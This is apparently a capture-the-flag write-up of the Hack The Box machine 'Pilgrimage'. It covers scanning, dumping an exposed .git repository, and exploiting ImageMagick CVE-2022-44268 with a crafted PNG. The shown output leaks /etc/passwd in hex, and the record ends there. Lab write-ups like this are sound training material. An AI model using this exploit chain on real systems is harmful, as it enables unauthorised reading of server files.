+++
title = "HTB Writeup - Pilgrimage (Easy)"
author = "CyberSpider"
description = "Writeup of Pilgrimage from Hack The Box."
tags = ['htb', 'easy', 'linux', 'LFI' ]
lastmod = 2023-09-06
draft = false
+++

The `Pilgrimage` machine is an easy linux box.

![Scenario 1: Across columns](/images/Pilgrimage.png#center)


## Nmap Scan

I do a `nmap scan`:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.11.219  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 09:34 EDT
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 35.60% done; ETC: 09:35 (0:00:09 remaining)
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I edit this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.219    pilgrimage.htb
```
## HTTP

I find a `/register.php` , I register me, and then I do the login in the `/login.php`:
```sh
http://pilgrimage.htb/login.php
```

I do the directory enumeration with `ffuf`:
```sh
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u  http://pilgrimage.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pilgrimage.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 53ms]
    * FUZZ: .git

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 53ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 61ms]
    * FUZZ: .htaccess

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 46ms]
    * FUZZ: assets

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 51ms]
    * FUZZ: tmp

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 49ms]
    * FUZZ: vendor

:: Progress: [20476/20476] :: Job [1/1] :: 806 req/sec :: Duration: [0:00:26] :: Errors: 0 ::


┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://pilgrimage.htb/FUZZ  -recursion -recursion-depth 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pilgrimage.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 113ms]
    * FUZZ: .htaccess

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 117ms]
    * FUZZ: .htpasswd

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 124ms]
    * FUZZ: .git

[INFO] Adding a new job to the queue: http://pilgrimage.htb/.git/FUZZ

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms]
    * FUZZ: assets

[INFO] Adding a new job to the queue: http://pilgrimage.htb/assets/FUZZ

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 115ms]
    * FUZZ: tmp

[INFO] Adding a new job to the queue: http://pilgrimage.htb/tmp/FUZZ

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms]
    * FUZZ: vendor

[INFO] Adding a new job to the queue: http://pilgrimage.htb/vendor/FUZZ

[INFO] Starting queued job on target: http://pilgrimage.htb/.git/FUZZ

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 116ms]
    * FUZZ: .htaccess

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 116ms]
    * FUZZ: .htpasswd

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 120ms]
    * FUZZ: branches

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/branches/
[Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 115ms]
    * FUZZ: config

[Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 114ms]
    * FUZZ: description

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms]
    * FUZZ: hooks

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/hooks/
[Status: 200, Size: 3768, Words: 22, Lines: 16, Duration: 117ms]
    * FUZZ: index

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 115ms]
    * FUZZ: info

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/info/
[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms]
    * FUZZ: logs

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/logs/
[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms]
    * FUZZ: objects

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/objects/
[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms]
    * FUZZ: refs

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/refs/
[INFO] Starting queued job on target: http://pilgrimage.htb/assets/FUZZ

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 118ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 119ms]
    * FUZZ: .htaccess

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms]
    * FUZZ: css

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/assets/css/
[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms]
    * FUZZ: images

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/assets/images/
[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 122ms]
    * FUZZ: js

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/assets/js/
[INFO] Starting queued job on target: http://pilgrimage.htb/tmp/FUZZ

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 125ms]
    * FUZZ: .htaccess

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 125ms]
    * FUZZ: .htpasswd

[INFO] Starting queued job on target: http://pilgrimage.htb/vendor/FUZZ

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 119ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 119ms]
    * FUZZ: .htaccess

[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 115ms]
    * FUZZ: jquery

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/vendor/jquery/
:: Progress: [20476/20476] :: Job [5/5] :: 330 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```

We found `.git` directory on the website
After we found `.git` directory, we can dump the directory to get the source code using `https://github.com/arthaud/git-dumper`:
```sh
┌──(kali㉿kali)-[~/git-dumper]
└─$ python3 git_dumper.py http://pilgrimage.htb/.git/ Pilgrimage
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://pilgrimage.htb/.git/index [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]
[-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404]
[-] http://pilgrimage.htb/.git/objects/info/packs responded with status code 404
[-] Finding refs/
[-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404]
[-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/config [200]
[-] Fetching http://pilgrimage.htb/.git/info/refs [404]
[-] http://pilgrimage.htb/.git/info/refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/ORIG_HEAD [404]
[-] http://pilgrimage.htb/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/logs/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/stash [404]
[-] http://pilgrimage.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/packed-refs [404]
[-] http://pilgrimage.htb/.git/packed-refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/stash [404]
[-] http://pilgrimage.htb/.git/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://pilgrimage.htb/.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f [200]
[-] Fetching http://pilgrimage.htb/.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/36/c734d44fe952682020fd9762ee9329af51848d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8f/155a75593279c9723a1b15e5624a304a174af2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/98/10e80fba2c826a142e241d0f65a07ee580eaad [200]
[-] Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .

┌──(kali㉿kali)-[~/git-dumper]
└─$ cd Pilgrimage

┌──(kali㉿kali)-[~/git-dumper/Pilgrimage]
└─$ ls -all 
total 26972
drwxr-xr-x 5 kali kali     4096 Sep  6 09:51 .
drwxr-xr-x 4 kali kali     4096 Sep  6 09:51 ..
drwxr-xr-x 6 kali kali     4096 Sep  6 09:51 assets
-rwxr-xr-x 1 kali kali     5538 Sep  6 09:51 dashboard.php
drwxr-xr-x 7 kali kali     4096 Sep  6 09:51 .git
-rwxr-xr-x 1 kali kali     9250 Sep  6 09:51 index.php
-rwxr-xr-x 1 kali kali     6822 Sep  6 09:51 login.php
-rwxr-xr-x 1 kali kali       98 Sep  6 09:51 logout.php
-rwxr-xr-x 1 kali kali 27555008 Sep  6 09:51 magick
-rwxr-xr-x 1 kali kali     6836 Sep  6 09:51 register.php
drwxr-xr-x 4 kali kali     4096 Sep  6 09:51 vendor

┌──(kali㉿kali)-[~/git-dumper/Pilgrimage]
└─$ tree .
.
├── assets
│   ├── bulletproof.php
│   ├── css
│   │   ├── animate.css
│   │   ├── custom.css
│   │   ├── flex-slider.css
│   │   ├── fontawesome.css
│   │   ├── owl.css
│   │   └── templatemo-woox-travel.css
│   ├── images
│   │   ├── banner-04.jpg
│   │   └── cta-bg.jpg
│   ├── js
│   │   ├── custom.js
│   │   ├── isotope.js
│   │   ├── isotope.min.js
│   │   ├── owl-carousel.js
│   │   ├── popup.js
│   │   └── tabs.js
│   └── webfonts
│       ├── fa-brands-400.ttf
│       ├── fa-brands-400.woff2
│       ├── fa-regular-400.ttf
│       ├── fa-regular-400.woff2
│       ├── fa-solid-900.ttf
│       ├── fa-solid-900.woff2
│       ├── fa-v4compatibility.ttf
│       └── fa-v4compatibility.woff2
├── dashboard.php
├── index.php
├── login.php
├── logout.php
├── magick
├── register.php
└── vendor
    ├── bootstrap
    │   ├── css
    │   │   └── bootstrap.min.css
    │   └── js
    │       └── bootstrap.min.js
    └── jquery
        ├── jquery.js
        ├── jquery.min.js
        ├── jquery.min.map
        ├── jquery.slim.js
        ├── jquery.slim.min.js
        └── jquery.slim.min.map

11 directories, 37 files

┌──(kali㉿kali)-[~/git-dumper/Pilgrimage]
└─$ ./magick         
Error: Invalid argument or not enough arguments

Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
       magick -help | -version | -usage | -list {option}


┌──(kali㉿kali)-[~/git-dumper/Pilgrimage]
└─$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```


## Local File Inclusion
 
 
I have discover a  `CVE-2022-44268`, I use `https://github.com/Sybil-Scan/imagemagick-lfi-poc` to exploit it:
```sh
┌──(kali㉿kali)-[~]
└─$ gh repo clone Sybil-Scan/imagemagick-lfi-poc
Cloning into 'imagemagick-lfi-poc'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 2), reused 6 (delta 1), pack-reused 0
Receiving objects: 100% (10/10), done.
Resolving deltas: 100% (2/2), done.

┌──(kali㉿kali)-[~]
└─$ ls
imagemagick-lfi-poc 

┌──(kali㉿kali)-[~]
└─$ cd  imagemagick-lfi-poc 

┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ ls
generate.py  README.md

┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ python3 generate.py -f "/etc/passwd" -o lupin.png 

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > lupin.png
   ```
   
Now I go in this directory `http://pilgrimage.htb/` to `upload` this image:
- Request:
```http
POST / HTTP/1.1
Host: pilgrimage.htb
Content-Length: 1420
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://pilgrimage.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1C2vBn2TojVZ6gUR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://pilgrimage.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=jqr0bgdhrmgpc14rrb7buvb31u
Connection: close

------WebKitFormBoundary1C2vBn2TojVZ6gUR
Content-Disposition: form-data; name="toConvert"; filename="lupin.png"
Content-Type: image/png


PNG


```

- Response:
```http
HTTP/1.1 302 Found
Server: nginx/1.18.0
Date: Wed, 06 Sep 2023 14:09:56 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /?message=http://pilgrimage.htb/shrunk/64f88834a7752.png&status=success
Content-Length: 7625

<!DOCTYPE html>
<html lang="en">

  <head>

    <meta c
```
   
Now I go in this directory `/shrunk/64f88834a7752.png` to `download` the image, I use `cURL` to download it:
```sh
┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ curl http://pilgrimage.htb/shrunk/64f88834a7752.png -O 64f88834a7752.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1688  100  1688    0     0   7286      0 --:--:-- --:--:-- --:--:--  7307
                                                    
```

I `analyze` the converted image using this command:
```sh
┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ identify -verbose 64f88834a7752.png 
Image: 64f88834a7752.png
  Format: PNG (Portable Network Graphics)
  Geometry: 128x128
  Class: DirectClass
  Type: true color
  Depth: 8 bits-per-pixel component
  Channel Depths:
    Red:      8 bits
    Green:    8 bits
    Blue:     8 bits
  Channel Statistics:
    Red:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                 65278.00 (0.9961)
      Mean:                    11062.54 (0.1688)
      Standard Deviation:      15530.77 (0.2370)
    Blue:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.6Ki
  Interlace: No
  Orientation: Unknown
  Background Color: white
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 128x128+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 2
  Png:IHDR.bit-depth-orig: 8
  Raw profile type: 

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

  Date:create: 2023-09-06T14:09:56+00:00
  Date:modify: 2023-09-06T14:09:56+00:00
  Date:timestamp: 2023-09-06T14:09:56+00:00
  Signature: 6eb1ce5d5108a4858c3cf5ba93eda43f449d4a7659a024a2e03436fe9a1f8771
  Tainted: False
